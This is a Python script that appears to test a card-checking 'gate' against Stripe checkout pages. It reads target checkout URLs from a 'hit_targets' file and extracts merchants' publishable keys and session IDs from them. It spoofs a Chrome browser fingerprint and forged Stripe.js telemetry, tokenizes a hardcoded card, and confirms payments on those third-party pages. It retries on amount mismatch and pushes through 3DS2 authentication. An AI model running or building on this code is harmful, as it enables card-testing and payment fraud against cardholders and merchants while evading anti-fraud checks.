import asyncio
import json
import os
import sys
import time
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from curl_cffi.requests import AsyncSession
import gate_client as gc
import stripe_fid

TEST_CARD_3DS = "4937241006643332|02|31|275"

async def test_3ds():
    with open("data/hit_targets.txt", "r", encoding="utf-8") as f:
        targets = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    
    print(f"Loaded {len(targets)} targets")
    target_url = targets[0]
    
    d = stripe_fid.decode_fragment(target_url)
    pk = str(d.get("apiKey") or "")
    cs = str(d.get("checkoutSessionId") or "")
    print(f"Target: pk={pk[:25]}... cs={cs}")
    
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        r = await s.get(f"https://api.stripe.com/v1/payment_pages/{cs}",
                        params={"key": pk},
                        headers={"Origin": "https://js.stripe.com",
                                 "Referer": "https://js.stripe.com/",
                                 "Accept": "application/json"}, timeout=12)
        print("GET payment_pages status:", r.status_code)
        data = r.json()
        pi = data.get("payment_intent") or {}
        print("PI ID:", pi.get("id"), "Status:", pi.get("status"), "Amount:", pi.get("amount"), pi.get("currency"))
        
        # Tokenize card
        card = gc.parse_card(TEST_CARD_3DS)
        telem = gc.stripe_telemetry(target_url, pk)
        r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
                             data=gc.tokenize_body(card, telem, target_url),
                             headers=gc.TOKENIZE_HEADERS, timeout=10)
        tok_data = r_tok.json()
        pm_id = tok_data.get("id")
        print(f"Tokenized PM: {pm_id}")
        
        # Confirm
        body = {
            "key": pk,
            "eid": "NA",
            "payment_method": pm_id,
            "expected_payment_method_type": "card",
            "expected_amount": str(pi.get("amount", 0)),
            "return_url": target_url.split("#")[0],
        }
        if data.get("init_checksum"):
            body["init_checksum"] = data["init_checksum"]
            
        r_conf = await s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                              data=body,
                              headers={"Origin": "https://js.stripe.com",
                                       "Referer": "https://js.stripe.com/",
                                       "Accept": "application/json"}, timeout=20)
        print("Confirm HTTP status:", r_conf.status_code)
        conf_resp = r_conf.json()
        if r_conf.status_code == 400 and "amount_mismatch" in conf_resp.get("error", {}).get("code", ""):
            print("Handling amount mismatch...")
            r_get = await s.get(f"https://api.stripe.com/v1/payment_pages/{cs}",
                                params={"key": pk},
                                headers={"Origin": "https://js.stripe.com",
                                         "Referer": "https://js.stripe.com/",
                                         "Accept": "application/json"}, timeout=12)
            data2 = r_get.json()
            pi2 = data2.get("payment_intent") or {}
            print("Updated PI Amount:", pi2.get("amount"), "Checksum:", data2.get("init_checksum"))
            body["expected_amount"] = str(pi2.get("amount", 0))
            if data2.get("init_checksum"):
                body["init_checksum"] = data2["init_checksum"]
            body["eid"] = str(uuid.uuid4())
            r_conf = await s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                                  data=body,
                                  headers={"Origin": "https://js.stripe.com",
                                           "Referer": "https://js.stripe.com/",
                                           "Accept": "application/json"}, timeout=20)
            conf_resp = r_conf.json()
            print("Retry Confirm HTTP status:", r_conf.status_code)
            print("Retry Confirm response:", json.dumps(conf_resp, indent=2))

        pi_conf = conf_resp.get("payment_intent") or {}
        print("PI Status:", pi_conf.get("status"))
        print("Next Action:")
        print(json.dumps(pi_conf.get("next_action"), indent=2))
        
        na = pi_conf.get("next_action") or {}
        source_id = None
        if na.get("type") == "use_stripe_sdk":
            sdk = na.get("use_stripe_sdk") or {}
            print("SDK type:", sdk.get("type"))
            source_id = sdk.get("three_d_secure_2_source") or sdk.get("source") or sdk.get("three_d_secure_2")
            print("Source ID:", source_id)
            
        if source_id:
            print("\nAttempting 3DS2 Authenticate...")
            res_3ds = await gc.stripe_3ds2_authenticate(s, pk, source_id)
            print("3DS2 Authenticate result:")
            print(json.dumps(res_3ds, indent=2))

if __name__ == "__main__":
    asyncio.run(test_3ds())
